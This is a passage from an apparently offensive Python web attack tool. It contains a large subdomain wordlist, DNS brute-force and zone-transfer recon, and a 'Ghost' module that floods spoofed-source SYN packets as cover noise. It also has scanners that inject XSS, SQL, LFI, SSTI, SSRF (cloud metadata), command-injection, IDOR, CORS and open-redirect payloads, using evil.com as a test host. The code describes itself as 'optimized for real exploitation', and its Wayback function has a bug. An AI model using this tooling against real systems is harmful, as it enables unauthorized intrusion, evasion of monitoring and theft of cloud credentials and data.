        "drone-cli", "drone-web", "drone-api", "drone-secret", "drone-cron",
        "concourse", "concourse-dev", "concourse-staging", "concourse-prod", "concourse-test",
        "concourse-web", "concourse-worker", "concourse-db", "concourse-tsa", "concourse-web-ui",
        "tekton", "tekton-dev", "tekton-staging", "tekton-prod", "tekton-test",
        "tekton-pipelines", "tekton-triggers", "tekton-dashboard", "tekton-cli", "tekton-chains",
        "tekton-results", "tekton-hub", "tekton-operator", "tekton-catalog", "tekton-metrics",
        "buildkite", "buildkite-dev", "buildkite-staging", "buildkite-prod", "buildkite-agent",
        "buildkite-hook", "buildkite-queue", "buildkite-metrics", "buildkite-webhook", "buildkite-pipeline",
        "github-actions-runner", "github-runner01", "github-runner02", "github-runner03", "github-runners-dev",
        "gitlab-runner01", "gitlab-runner02", "gitlab-runner03", "gitlab-runner04", "gitlab-runner05",
        "gitlab-runner-docker", "gitlab-runner-k8s", "gitlab-runner-cache", "gitlab-runner-minio", "gitlab-runner-registry",
        "azure-pipelines-agent", "azure-agent01", "azure-agent02", "azure-agent03", "azure-pipelines-runner",
        "circleci-runner", "circleci-agent01", "circleci-agent02", "circleci-runner-dev", "circleci-runner-prod",
        "travis-runner", "travis-agent01", "travis-agent02", "travis-runner-dev", "travis-runner-prod",
        "spinnaker", "spinnaker-dev", "spinnaker-staging", "spinnaker-prod", "spinnaker-test",
        "spinnaker-deck", "spinnaker-gate", "spinnaker-orca", "spinnaker-clouddriver", "spinnaker-igor",
        "spinnaker-front50", "spinnaker-rosco", "spinnaker-echo", "spinnaker-fiat", "spinnaker-kayenta",
        "octopus-deploy", "octopus-dev", "octopus-staging", "octopus-prod", "octopus-test",
        "octopus-server", "octopus-worker", "octopus-queue", "octopus-package", "octopus-tenant",
        "teamcity", "teamcity-dev", "teamcity-staging", "teamcity-prod", "teamcity-test",
        "teamcity-server", "teamcity-agent", "teamcity-build", "teamcity-project", "teamcity-queue",
        
        # ==================== 1701-1800: STORAGE & OBJECT STORAGE ====================
        "s3-bucket", "s3-buckets", "s3-data", "s3-backup", "s3-logs",
        "s3-assets", "s3-media", "s3-images", "s3-static", "s3-download",
        "s3-uploads", "s3-storage", "s3-archive", "s3-cold", "s3-glacier",
        "gcs", "gcs-bucket", "gcs-data", "gcs-backup", "gcs-storage",
        "gcs-assets", "gcs-media", "gcs-logs", "gcs-archive", "gcs-static",
        "azure-blob", "azure-blob-storage", "azure-blob-dev", "azure-blob-prod", "azure-blob-logs",
        "azure-blob-backup", "azure-blob-media", "azure-blob-assets", "azure-blob-archive", "azure-blob-container",
        "minio-storage", "minio-buckets", "minio-data", "minio-backup", "minio-logs",
        "minio-assets", "minio-media", "minio-static", "minio-archive", "minio-tenant",
        "ceph-storage", "ceph-bucket", "ceph-rgw", "ceph-radosgw", "ceph-s3",
        "ceph-dash", "ceph-monitoring", "ceph-mgr", "ceph-osd-storage", "ceph-pool",
        "gluster-storage", "gluster-brick", "gluster-volume", "gluster-heal", "gluster-rebalance",
        "nfs-storage", "nfs-export", "nfs-share", "nfs-backup", "nfs-archive",
        "storage01-data", "storage01-backup", "storage01-logs", "storage01-archive", "storage01-assets",
        "storage02-data", "storage02-backup", "storage02-logs", "storage02-archive", "storage02-assets",
        "nas", "nas01", "nas02", "nas03", "nas-storage",
        "nas-backup", "nas-archive", "nas-media", "nas-share", "nas-volume",
        "san", "san01", "san02", "san03", "san-storage",
        "san-iscsi", "san-fc", "san-lun", "san-volume", "san-snapshot",
        "datastore", "datastore01", "datastore02", "datastore03", "datastore-vm",
        "datastore-cluster", "datastore-prod", "datastore-dev", "datastore-staging", "datastore-backup",
        "volume01", "volume02", "volume03", "volume04", "volume05",
        "volume-data", "volume-backup", "volume-logs", "volume-archive", "volume-assets",
        "backup-storage", "backup-store", "backup-repo", "backup-location", "backup-target",
        "backup-archive", "backup-s3", "backup-gcs", "backup-azure", "backup-minio",
        "backup-veeam", "veeam-backup", "veeam-repo", "veeam-server", "veeam-proxy",
        "backup-tarsnap", "tarsnap-backup", "tarsnap-cache", "tarsnap-key", "tarsnap-master",
        "restic-repo", "restic-storage", "restic-cache", "restic-aws", "restic-b2",
        "borg-repo", "borg-storage", "borg-cache", "borg-server", "borg-client",
        "duplicati-storage", "duplicati-repo", "duplicati-backups", "duplicati-db", "duplicati-server",
        "rsync-storage", "rsync-module", "rsync-repo", "rsync-backup", "rsync-server",
        
        # ==================== 1801-1900: MISCELLANEOUS & UTILITIES ====================
        "phpmyadmin", "pma", "phpmyadmin-dev", "phpmyadmin-prod", "myadmin",
        "adminer", "adminer-dev", "adminer-prod", "adminer-mysql", "adminer-postgres",
        "phpmyadmin-old", "phpmyadmin-legacy", "phpmyadmin-stable", "phpmyadmin-test", "phpmyadmin-staging",
        "phppgadmin", "pga", "phppgadmin-dev", "phppgadmin-prod", "pgadmin",
        "pgadmin4", "pgadmin-dev", "pgadmin-prod", "pgadmin-staging", "pgadmin-login",
        "mysql-workbench", "mysqladmin", "mysql-gui", "mysql-admin", "mysql-dev",
        "mongo-express", "mongo-express-dev", "mongo-express-prod", "mongo-admin", "mongo-gui",
        "redis-commander", "redis-commander-dev", "redis-commander-prod", "redis-admin", "redis-gui",
        "rabbitmq-admin", "rabbitmq-gui", "rabbitmq-management", "rabbitmq-dev", "rabbitmq-prod",
        "kafka-ui", "kafka-ui-dev", "kafka-ui-prod", "kafka-manager", "kafka-tool",
        "elasticsearch-head", "elasticsearch-gui", "elasticsearch-admin", "elasticsearch-dev", "elasticsearch-prod",
        "cerebro", "cerebro-elastic", "cerebro-dev", "cerebro-prod", "cerebro-admin",
        "dejavu", "dejavu-elastic", "dejavu-dev", "dejavu-prod", "dejavu-gui",
        "kibana-dev", "kibana-prod", "kibana-staging", "kibana-admin", "kibana-analysis",
        "grafana-dev", "grafana-prod", "grafana-staging", "grafana-admin", "grafana-view",
        "prometheus-ui", "prometheus-dev", "prometheus-prod", "prometheus-staging", "prometheus-graph",
        "alertmanager-ui", "alertmanager-dev", "alertmanager-prod", "alertmanager-silence", "alertmanager-alert",
        "thanos-query", "thanos-ui", "thanos-dev", "thanos-prod", "thanos-compact",
        "loki-ui", "loki-dev", "loki-prod", "loki-query", "loki-read",
        "tempo-ui", "tempo-dev", "tempo-prod", "tempo-query", "tempo-trace",
        "jaeger-ui", "jaeger-dev", "jaeger-prod", "jaeger-query", "jaeger-collector",
        "zipkin-ui", "zipkin-dev", "zipkin-prod", "zipkin-query", "zipkin-collector",
        "pyroscope", "pyroscope-dev", "pyroscope-prod", "pyroscope-ui", "pyroscope-server",
        "parca", "parca-dev", "parca-prod", "parca-ui", "parca-query",
        "vector-ui", "vector-dev", "vector-prod", "vector-topology", "vector-metrics",
        "webmin", "webmin-dev", "webmin-prod", "webmin-staging", "webmin-system",
        "cpanel", "cpanel-dev", "cpanel-prod", "cpanel-staging", "cpanel-whm",
        "whm", "whmcs", "whmcs-dev", "whmcs-prod", "whmcs-admin",
        "plesk", "plesk-dev", "plesk-prod", "plesk-staging", "plesk-admin",
        "virtualmin", "virtualmin-dev", "virtualmin-prod", "virtualmin-staging", "virtualmin-webmin",
        "ispconfig", "ispconfig-dev", "ispconfig-prod", "ispconfig-admin", "ispconfig-web",
        "vestacp", "vestacp-dev", "vestacp-prod", "vestacp-admin", "vestacp-gui",
        "ajenti", "ajenti-dev", "ajenti-prod", "ajenti-admin", "ajenti-web",
        "cockpit", "cockpit-dev", "cockpit-prod", "cockpit-staging", "cockpit-server",
        "portainer", "portainer-dev", "portainer-prod", "portainer-staging", "portainer-gui",
        "rancher-ui", "rancher-dev", "rancher-prod", "rancher-staging", "rancher-cluster-ui",
        "k8s-dashboard", "kubernetes-dashboard", "k8s-ui", "k8s-dev-ui", "k8s-prod-ui",
        
        # ==================== 1901-2000: GENERIC & COMMON PREFIXES ====================
        "www2", "www3", "www4", "www5", "www6", "www7", "www8", "www9", "www10",
        "web2", "web3", "web4", "web5", "web6", "web7", "web8", "web9", "web10",
        "app2", "app3", "app4", "app5", "app6", "app7", "app8", "app9", "app10",
        "api2", "api3", "api4", "api5", "api6", "api7", "api8", "api9", "api10",
        "www-lb", "www-lb2", "www-lb3", "app-lb", "app-lb2", "app-lb3", "api-lb", "api-lb2", "api-lb3",
        "www-cdn", "www-cdn2", "app-cdn", "app-cdn2", "api-cdn", "api-cdn2", "static-cdn", "static-cdn2", "media-cdn",
        "edge", "edge01", "edge02", "edge03", "edge04", "edge05",
        "edge-cache", "edge-proxy", "edge-gateway", "edge-router", "edge-service",
        "origin", "origin01", "origin02", "origin03", "origin-cache", "origin-server",
        "cache", "cache01", "cache02", "cache03", "cache04", "cache05",
        "cache-proxy", "cache-server", "cache-redis", "cache-memcache", "cache-cloud",
        "session", "session01", "session02", "session03", "session-store", "session-redis",
        "queue", "queue01", "queue02", "queue03", "queue-service", "queue-worker",
        "worker", "worker01", "worker02", "worker03", "worker04", "worker05",
        "worker-app", "worker-prod", "worker-dev", "worker-staging", "worker-queue",
        "batch", "batch01", "batch02", "batch03", "batch-processor", "batch-job",
        "cron", "cron01", "cron02", "cron03", "cron-service", "cron-scheduler",
        "job", "job01", "job02", "job03", "job-server", "job-processor",
        "task", "task01", "task02", "task03", "task-service", "task-worker",
        "pipeline", "pipeline01", "pipeline02", "pipeline03", "pipeline-service", "pipeline-runner",
        "pipeline-dev", "pipeline-prod", "pipeline-staging", "pipeline-jenkins", "pipeline-drone",
        "release", "release01", "release02", "release03", "release-service", "release-manager",
        "deploy", "deploy01", "deploy02", "deploy03", "deploy-service", "deploy-application",
        "deploy-dev", "deploy-prod", "deploy-staging", "deploy-kubernetes", "deploy-helm",
        "build", "build01", "build02", "build03", "build-service", "build-server",
        "build-artifacts", "build-cache", "build-docker", "build-jenkins", "build-gitlab",
        "test", "test01", "test02", "test03", "test-service", "test-application",
        "test-automation", "test-selenium", "test-jmeter", "test-load", "test-perf",
        "staging-load", "staging-lb", "staging-nginx", "staging-php", "staging-node",
        "preprod", "pre-production", "pre-prod-lb", "pre-prod-api", "pre-prod-web",
        "uat-load", "uat-lb", "uat-nginx", "uat-app", "uat-api",
        "prod-load", "prod-lb", "prod-nginx", "prod-php", "prod-node",
        "prod-db", "prod-redis", "prod-elastic", "prod-kafka", "prod-mongodb",
        "prod-cache", "prod-queue", "prod-worker", "prod-cron", "prod-batch",
        
        # Final entries to reach 2000
        "backup-db", "backup-redis", "backup-postgres", "backup-mysql", "backup-mongo",
        "snapshot", "snapshot-daily", "snapshot-weekly", "snapshot-monthly", "snapshot-hourly",
        "mirror", "mirror01", "mirror02", "mirror03", "mirror-repo",
        "replica", "replica01", "replica02", "replica03", "replica-db",
    ]
    
    def __init__(self, config: Config):
        self.config = config
    
    async def crtsh(self, domain: str, session: SessionManager) -> Set[str]:
        """CRT.sh certificate transparency search."""
        subdomains = set()
        try:
            resp = await session.fetch(f"https://crt.sh/?q=%.{domain}&output=json")
            if resp['status'] == 200 and resp['text']:
                data = json.loads(resp['text'])
                for entry in data:
                    for name in entry.get('name_value', '').split('\n'):
                        name = name.strip().strip('*.').lower()
                        if domain in name and '*' not in name and not name.startswith('.'):
                            subdomains.add(name)
            logger.info(f"CRT.sh: {len(subdomains)} subdomains found")
        except Exception as e:
            logger.warning(f"CRT.sh failed: {e}")
        return subdomains
    
    async def wayback(self, domain: str, session: SessionManager) -> Set[str]:
        """Wayback Machine URL discovery."""
        urls = set()
        try:
            url = f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&collapse=urlkey&fl=original&limit=5000"
            resp = await session.fetch(url)
            if resp['status'] == 200 and resp['text']:
                data = json.loads(resp['text'])
                for row in data[1:]:
                    if row and domain in row[0]:
                        urls.add(row[0])
                        # Extract subdomain
                        try:
                            parsed = urlparse(row[0])
                            if parsed.netloc and domain in parsed.netloc:
                                subdomains.add(parsed.netloc.lower())
                        except Exception:
                            pass
            logger.info(f"Wayback: {len(urls)} URLs found")
        except Exception as e:
            logger.warning(f"Wayback failed: {e}")
        return urls
    
    async def dns_brute(self, domain: str) -> Set[str]:
        """DNS subdomain brute-force using wordlist."""
        subdomains = set()
        wordlist = self.SUBDOMAIN_WORDLIST[:self.config.recon_dns_brute_wordlist_size]
        
        resolver = dns.resolver.Resolver()
        resolver.timeout = 2
        resolver.lifetime = 3
        resolver.nameservers = ['8.8.8.8', '8.8.4.4', '1.1.1.1']
        
        found = 0
        for sub in wordlist:
            try:
                target = f"{sub}.{domain}"
                answers = resolver.resolve(target, 'A')
                if answers:
                    subdomains.add(target)
                    found += 1
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers):
                pass
            except Exception:
                pass
        
        logger.info(f"DNS Brute: {found}/{len(wordlist)} subdomains found")
        return subdomains
    
    async def subdomain_permutation(self, domain: str, base_subdomains: Set[str]) -> Set[str]:
        """Generate subdomain permutations."""
        permutations = set()
        words = ['dev', 'stage', 'staging', 'test', 'qa', 'prod', 'api', 'admin', 'portal']
        
        for sub in base_subdomains:
            parts = sub.split('.')
            if len(parts) > 1:
                prefix = parts[0]
                base = '.'.join(parts[1:])
                
                for word in words:
                    permutations.add(f"{prefix}-{word}.{base}")
                    permutations.add(f"{word}-{prefix}.{base}")
                    permutations.add(f"{prefix}{word}.{base}")
                    permutations.add(f"{word}{prefix}.{base}")
        
        return permutations
    
    async def zone_transfer(self, domain: str) -> Set[str]:
        """Attempt DNS zone transfer."""
        subdomains = set()
        
        try:
            # Find nameservers
            answers = dns.resolver.resolve(domain, 'NS')
            nameservers = [str(ns) for ns in answers]
            
            for ns in nameservers:
                try:
                    ns_ip = str(dns.resolver.resolve(ns, 'A')[0])
                    zone = dns.zone.from_xfr(dns.query.xfr(ns_ip, domain, timeout=5))
                    for name, node in zone.nodes.items():
                        subdomain = f"{name}.{domain}".strip('.')
                        if subdomain:
                            subdomains.add(subdomain)
                    logger.info(f"Zone transfer from {ns}: {len(subdomains)} records")
                    break
                except Exception:
                    continue
        except Exception as e:
            logger.debug(f"Zone transfer failed: {e}")
        
        return subdomains
    
    async def whois_lookup(self, domain: str) -> Dict:
        """WHOIS lookup for domain information."""
        result = {}
        if HAS_WHOIS:
            try:
                w = whois.whois(domain)
                result = {
                    'registrar': w.registrar,
                    'creation_date': str(w.creation_date),
                    'expiration_date': str(w.expiration_date),
                    'name_servers': w.name_servers,
                    'emails': w.emails,
                }
                logger.info(f"WHOIS: {domain} - {w.registrar}")
            except Exception as e:
                logger.debug(f"WHOIS failed: {e}")
        return result
    
    async def full_recon(self, domain: str, session: SessionManager, db: Database) -> Tuple[Set[str], Set[str]]:
        """Execute complete reconnaissance."""
        all_subdomains = set()
        all_urls = set()
        
        # Phase 1: Certificate Transparency
        if self.config.recon_crtsh:
            print(f"  {CY}[CRT.sh]{NC} Searching certificate logs...")
            subs = await self.crtsh(domain, session)
            for s in subs:
                db.save_recon_data(domain, 'subdomain', s, 'crtsh')
                all_subdomains.add(s)
            print(f"    {GN}→ {len(subs)} subdomains{NC}")
        
        # Phase 2: Wayback Machine
        if self.config.recon_wayback:
            print(f"  {CY}[Wayback]{NC} Searching archives...")
            urls = await self.wayback(domain, session)
            for u in urls:
                db.save_recon_data(domain, 'url', u, 'wayback')
                all_urls.add(u)
            print(f"    {GN}→ {len(urls)} URLs{NC}")
        
        # Phase 3: DNS Brute-force
        if self.config.recon_dns_brute:
            print(f"  {CY}[DNS Brute]{NC} Brute-forcing subdomains...")
            subs = await self.dns_brute(domain)
            for s in subs:
                db.save_recon_data(domain, 'subdomain', s, 'dns_brute')
                all_subdomains.add(s)
            print(f"    {GN}→ {len(subs)} subdomains{NC}")
        
        # Phase 4: Subdomain Permutation
        if self.config.recon_subdomain_permutation and all_subdomains:
            print(f"  {CY}[Permutation]{NC} Generating permutations...")
            perms = await self.subdomain_permutation(domain, all_subdomains)
            new_perms = perms - all_subdomains
            for p in new_perms:
                db.save_recon_data(domain, 'subdomain', p, 'permutation')
                all_subdomains.add(p)
            print(f"    {GN}→ {len(new_perms)} new permutations{NC}")
        
        # Phase 5: Zone Transfer
        if self.config.recon_zone_transfer:
            print(f"  {CY}[Zone Transfer]{NC} Attempting zone transfer...")
            subs = await self.zone_transfer(domain)
            for s in subs:
                db.save_recon_data(domain, 'subdomain', s, 'zone_transfer')
                all_subdomains.add(s)
            if subs:
                print(f"    {GN}→ {len(subs)} records{NC}")
            else:
                print(f"    {YL}→ Failed (expected for most domains){NC}")
        
        # Phase 6: WHOIS
        if self.config.recon_whois:
            print(f"  {CY}[WHOIS]{NC} Looking up domain info...")
            whois_info = await self.whois_lookup(domain)
            if whois_info:
                print(f"    {GN}→ Registrar: {whois_info.get('registrar', 'Unknown')}{NC}")
        
        # Build URLs from subdomains
        for sub in all_subdomains:
            for scheme in ['https://', 'http://']:
                url = f"{scheme}{sub}"
                all_urls.add(url)
                db.save_recon_data(domain, 'url', url, 'generated')
        
        return all_subdomains, all_urls

# ═══════════════════════════════════════════════════════════════════════════════════════
# GHOST MODULES — NETWORK-LEVEL CAPABILITIES
# ═══════════════════════════════════════════════════════════════════════════════════════

class GhostModules:
    """Ghost capabilities — for authorized testing only."""
    
    @staticmethod
    def quantum_noise(threads: int = 2):
        """Generate background noise traffic."""
        if not HAS_SCAPY:
            print(f"  {YL}[Quantum Noise] Requires Scapy{NC}")
            return
        
        iface = get_interface()
        stop = threading.Event()
        stats = {'sent': 0}
        
        def worker():
            while not stop.is_set():
                try:
                    src = f"{random.randint(10,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                    dst = f"{random.randint(10,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                    pkt = IP(src=src, dst=dst)/TCP(sport=random.randint(1024,65535), dport=random.choice([80,443,22,445,8080]), flags='S')
                    send(pkt, verbose=0, iface=iface)
                    stats['sent'] += 1
                except Exception:
                    pass
                time.sleep(random.uniform(0.01, 0.05))
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
        
        return stop, stats
    
    @staticmethod
    def dna_clone(target: str) -> Dict:
        """Clone target fingerprint."""
        if not HAS_SCAPY:
            return {'error': 'Scapy required'}
        
        dna = {'target': target}
        
        try:
            pkt = IP(dst=target)/ICMP()
            resp = sr1(pkt, timeout=2, verbose=0)
            if resp:
                dna['ttl'] = resp[IP].ttl
                dna['ip_id'] = resp[IP].id
        except Exception:
            dna['ttl'] = random.choice([64, 128, 255])
        
        try:
            ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target), timeout=2, verbose=0)
            if ans:
                dna['mac'] = ans[ARP].hwsrc
        except Exception:
            dna['mac'] = get_mac()
        
        ttl = dna.get('ttl', 64)
        if ttl <= 64:
            dna['os'] = 'Linux/Unix/BSD'
        elif ttl <= 128:
            dna['os'] = 'Windows'
        else:
            dna['os'] = 'Network Device'
        
        dna['ports'] = []
        for port in [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 5432, 6379, 8080, 8443, 9090, 9200, 27017]:
            try:
                resp = sr1(IP(dst=target)/TCP(dport=port, flags='S'), timeout=0.5, verbose=0)
                if resp and resp[TCP].flags & 0x12:
                    dna['ports'].append(port)
            except Exception:
                pass
        
        return dna

# ═══════════════════════════════════════════════════════════════════════════════════════
# VULNERABILITY SCANNERS — SHARPENED TO MAXIMUM
# ═══════════════════════════════════════════════════════════════════════════════════════

class VulnerabilityScanners:
    """All vulnerability scanners — optimized for real exploitation."""
    
    @staticmethod
    async def scan_xss(session: SessionManager, url: str, param: str, config: Config, fp: FalsePositiveEngine) -> List[Dict]:
        """XSS scanner with 50+ payloads and WAF bypass."""
        findings = []
        payloads = PayloadLibrary.get_xss_payloads(config.xss_payload_count)
        
        baseline = await session.fetch(url)
        baseline_key = f"{url}|{param}"
        fp.cache_baseline(baseline_key, baseline) if hasattr(fp, 'cache_baseline') else None
        
        for payload in payloads[:config.xss_payload_count]:
            test_url = inject_payload(url, param, payload)
            resp = await session.fetch(test_url)
            
            if payload in resp['text'] and '&lt;' not in resp['text']:
                finding = {
                    'id': str(uuid.uuid4())[:12],
                    'target': urlparse(url).netloc,
                    'url': url,
                    'vuln_type': 'XSS',
                    'severity': 'HIGH',
                    'param': param,
                    'payload': payload,
                    'evidence': resp['text'][:500],
                    'confidence': 95,
                    'method': 'reflected',
                    'waf': resp.get('waf'),
                }
                
                if config.enable_fp_filter:
                    is_valid, reason = fp.validate(finding, baseline, resp)
                    if not is_valid:
                        continue
                    finding['confidence'] = 98
                
                findings.append(finding)
                break  # One confirmed XSS per parameter is enough
        
        return findings
    
    @staticmethod
    async def scan_sqli(session: SessionManager, url: str, param: str, config: Config, fp: FalsePositiveEngine) -> List[Dict]:
        """SQLi scanner with error-based, blind, and time-based detection."""
        findings = []
        payloads = PayloadLibrary.get_sqli_payloads(config.sqli_payload_count)
        
        baseline = await session.fetch(url)
        baseline_key = f"{url}|{param}"
        fp.cache_baseline(baseline_key, baseline) if hasattr(fp, 'cache_baseline') else None
        
        for payload, vuln_type in payloads[:config.sqli_payload_count]:
            test_url = inject_payload(url, param, payload)
            start = time.monotonic()
            resp = await session.fetch(test_url)
            elapsed = time.monotonic() - start
            
            error_indicators = ['sql syntax', 'mysql_fetch', 'unclosed quotation', 'sqlstate', 'ora-', 'postgresql']
            
            if resp['status'] == 500 or any(ind in resp['text'].lower() for ind in error_indicators) or elapsed > 3:
                finding = {
                    'id': str(uuid.uuid4())[:12],
                    'target': urlparse(url).netloc,
                    'url': url,
                    'vuln_type': vuln_type,
                    'severity': 'CRITICAL',
                    'param': param,
                    'payload': payload,
                    'evidence': resp['text'][:500] if resp['status'] == 500 else f'Time: {elapsed:.2f}s',
                    'confidence': 95,
                    'method': 'error' if resp['status'] == 500 else 'timing',
                    'waf': resp.get('waf'),
                    'response_time': elapsed,
                }
                
                if config.enable_fp_filter:
                    is_valid, reason = fp.validate(finding, baseline, resp)
                    if not is_valid:
                        continue
                    finding['confidence'] = 98
                
                findings.append(finding)
                break
        
        return findings
    
    @staticmethod
    async def scan_lfi(session: SessionManager, url: str, param: str, config: Config, fp: FalsePositiveEngine) -> List[Dict]:
        """LFI scanner with wrapper support."""
        findings = []
        payloads = PayloadLibrary.get_lfi_payloads()
        
        baseline = await session.fetch(url)
        
        for payload in payloads[:25]:
            test_url = inject_payload(url, param, payload)
            resp = await session.fetch(test_url)
            
            if 'root:x:' in resp['text'] or 'bin:x:' in resp['text'] or 'daemon:x:' in resp['text']:
                finding = {
                    'id': str(uuid.uuid4())[:12],
                    'target': urlparse(url).netloc,
                    'url': url,
                    'vuln_type': 'LFI',
                    'severity': 'HIGH',
                    'param': param,
                    'payload': payload,
                    'evidence': resp['text'][:500],
                    'confidence': 99,
                    'method': 'file_read',
                    'waf': resp.get('waf'),
                }
                
                if config.enable_fp_filter:
                    is_valid, reason = fp.validate(finding, baseline, resp)
                    if not is_valid:
                        continue
                    finding['confidence'] = 100
                
                findings.append(finding)
                break
        
        return findings
    
    @staticmethod
    async def scan_ssti(session: SessionManager, url: str, param: str, config: Config, fp: FalsePositiveEngine) -> List[Dict]:
        """SSTI scanner for all major template engines."""
        findings = []
        payloads = PayloadLibrary.get_ssti_payloads()
        
        baseline = await session.fetch(url)
        
        for payload, engine in payloads[:30]:
            test_url = inject_payload(url, param, payload)
            resp = await session.fetch(test_url)
            
            if '49' in resp['text'] and payload not in resp['text'] and '7*7' not in resp['text']:
                finding = {
                    'id': str(uuid.uuid4())[:12],
                    'target': urlparse(url).netloc,
                    'url': url,
                    'vuln_type': f'SSTI ({engine})',
                    'severity': 'HIGH',
                    'param': param,
                    'payload': payload,
                    'evidence': resp['text'][:500],
                    'confidence': 90,
                    'method': 'expression',
                    'waf': resp.get('waf'),
                }
                
                if config.enable_fp_filter:
                    is_valid, reason = fp.validate(finding, baseline, resp)
                    if not is_valid:
                        continue
                    finding['confidence'] = 95
                
                findings.append(finding)
                break
        
        return findings
    
    @staticmethod
    async def scan_ssrf(session: SessionManager, url: str, param: str, config: Config) -> List[Dict]:
        """SSRF scanner with cloud metadata detection."""
        findings = []
        payloads = PayloadLibrary.get_ssrf_payloads()
        
        for payload in payloads[:20]:
            test_url = inject_payload(url, param, payload)
            resp = await session.fetch(test_url)
            
            if any(kw in resp['text'] for kw in ['instance-id', 'ami-id', 'security-credentials', 'computeMetadata']):
                finding = {
                    'id': str(uuid.uuid4())[:12],
                    'target': urlparse(url).netloc,
                    'url': url,
                    'vuln_type': 'SSRF',
                    'severity': 'CRITICAL',
                    'param': param,
                    'payload': payload,
                    'evidence': resp['text'][:500],
                    'confidence': 98,
                    'method': 'cloud_metadata',
                    'waf': resp.get('waf'),
                    'validation_status': 'auto_verified',
                }
                findings.append(finding)
                break
        
        return findings
    
    @staticmethod
    async def scan_cmdi(session: SessionManager, url: str, param: str, config: Config, fp: FalsePositiveEngine) -> List[Dict]:
        """Command Injection scanner with filter bypass."""
        findings = []
        payloads = PayloadLibrary.get_cmdi_payloads()
        
        baseline = await session.fetch(url)
        
        for cmd, description in payloads[:25]:
            test_url = inject_payload(url, param, cmd)
            resp = await session.fetch(test_url)
            
            # Check for command output
            indicators = ['uid=', 'gid=', 'root', 'daemon', 'www-data', '/bin/', '/usr/', '/etc/']
            if any(ind in resp['text'] for ind in indicators) and 'CMDI_TEST' in resp['text'] if 'CMDI_TEST' in cmd else True:
                if 'CMDI_TEST' in cmd and 'CMDI_TEST' in baseline.get('text', ''):
                    continue
                
                finding = {
                    'id': str(uuid.uuid4())[:12],
                    'target': urlparse(url).netloc,
                    'url': url,
                    'vuln_type': 'Command Injection',
                    'severity': 'CRITICAL',
                    'param': param,
                    'payload': cmd,
                    'evidence': resp['text'][:500],
                    'confidence': 95,
                    'method': 'command_exec',
                    'waf': resp.get('waf'),
                }
                
                if config.enable_fp_filter:
                    is_valid, reason = fp.validate(finding, baseline, resp)
                    if not is_valid:
                        continue
                    finding['confidence'] = 98
                
                findings.append(finding)
                break
        
        return findings
    
    @staticmethod
    async def scan_idor(session: SessionManager, url: str, config: Config, fp: FalsePositiveEngine) -> List[Dict]:
        """IDOR scanner with sequential forcing."""
        findings = []
        patterns = [
            (r'[?&](?:user|account|uid|userId|profile|member)_?(?:id|ID)?[=_-]?(\d+)', 'user_id'),
            (r'/users?/(\d+)', 'user_path'),
            (r'/orders?/(\d+)', 'order_path'),
            (r'/invoices?/(\d+)', 'invoice_path'),
            (r'/api/v?\d+/users?/(\d+)', 'api_user'),
            (r'[?&](?:customer|client|patient|student|employee)_?(?:id|ID)?[=_-]?(\d+)', 'entity_id'),
        ]
        
        for pattern, category in patterns:
            match = re.search(pattern, url, re.IGNORECASE)
            if match:
                original = match.group(1)
                baseline = await session.fetch(url)
                
                test_values = []
                if original.isdigit():
                    val = int(original)
                    test_values = [str(val+1), str(val-1), str(val+2), str(val-2), '1', '0', str(val*2)]
                else:
                    test_values = [original + '_test', original + '1', 'admin', 'null', 'undefined']
                
                for test_val in test_values[:5]:
                    test_url = re.sub(r'(?<!\d)' + re.escape(original) + r'(?!\d)', test_val, url, count=1)
                    if test_url == url:
                        continue
                    
                    resp = await session.fetch(test_url)
                    
                    if resp['status'] == 200 and resp['size'] > 200:
                        if baseline and fp:
                            sim = fp.structural_similarity(baseline.get('text', ''), resp.get('text', ''))
                            if sim > 0.85 and resp['size'] == baseline.get('size', 0):
                                continue
                        
                        finding = {
                            'id': str(uuid.uuid4())[:12],
                            'target': urlparse(url).netloc,
                            'url': test_url,
                            'vuln_type': 'IDOR',
                            'severity': 'HIGH',
                            'param': category,
                            'payload': f'{original} → {test_val}',
                            'evidence': f'Status: {resp["status"]}, Size: {resp["size"]}',
                            'confidence': 85,
                            'method': 'reference_swap',
                            'waf': resp.get('waf'),
                            'validation_status': 'verified',
                        }
                        findings.append(finding)
        
        return findings
    
    @staticmethod
    async def scan_cors(session: SessionManager, url: str, config: Config) -> Optional[Dict]:
        """CORS misconfiguration scanner."""
        origins_to_test = [
            ('https://evil.com', 'External Origin'),
            ('null', 'Null Origin'),
            ('https://evil.' + urlparse(url).netloc.split('.')[-1], 'Subdomain-like Origin'),
            ('https://' + urlparse(url).netloc + '.evil.com', 'Prefixed Origin'),
            ('http://' + urlparse(url).netloc, 'HTTP Origin'),
        ]
        
        for origin, desc in origins_to_test:
            resp = await session.fetch(url, headers={'Origin': origin})
            acao = resp['headers'].get('Access-Control-Allow-Origin', '')
            acac = resp['headers'].get('Access-Control-Allow-Credentials', '')
            
            if acao == origin or acao == '*':
                severity = 'CRITICAL' if acac == 'true' and acao != '*' else 'HIGH' if acao == origin else 'MEDIUM'
                
                return {
                    'id': str(uuid.uuid4())[:12],
                    'target': urlparse(url).netloc,
                    'url': url,
                    'vuln_type': 'CORS Misconfiguration',
                    'severity': severity,
                    'param': 'Origin',
                    'payload': origin,
                    'evidence': f'ACAO: {acao}, ACAC: {acac}, Test: {desc}',
                    'confidence': 85,
                    'method': 'cors_check',
                    'waf': resp.get('waf'),
                    'validation_status': 'auto_verified',
                }
        
        return None
    
    @staticmethod
    async def scan_redirect(session: SessionManager, url: str, param: str, config: Config) -> Optional[Dict]:
        """Open redirect scanner."""
        payloads = [
            'https://evil.com',
            '//evil.com',
            '/\\evil.com',
            'https:evil.com',
            'evil.com',
            '%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d',
        ]
        
        for payload in payloads:
            test_url = inject_payload(url, param, payload)
            resp = await session.fetch(test_url)
            
            if resp['status'] in (301, 302, 303, 307, 308):
                location = resp['headers'].get('Location', '')
                if 'evil.com' in location.lower():
                    return {
                        'id': str(uuid.uuid4())[:12],
                        'target': urlparse(url).netloc,
                        'url': url,
                        'vuln_type': 'Open Redirect',
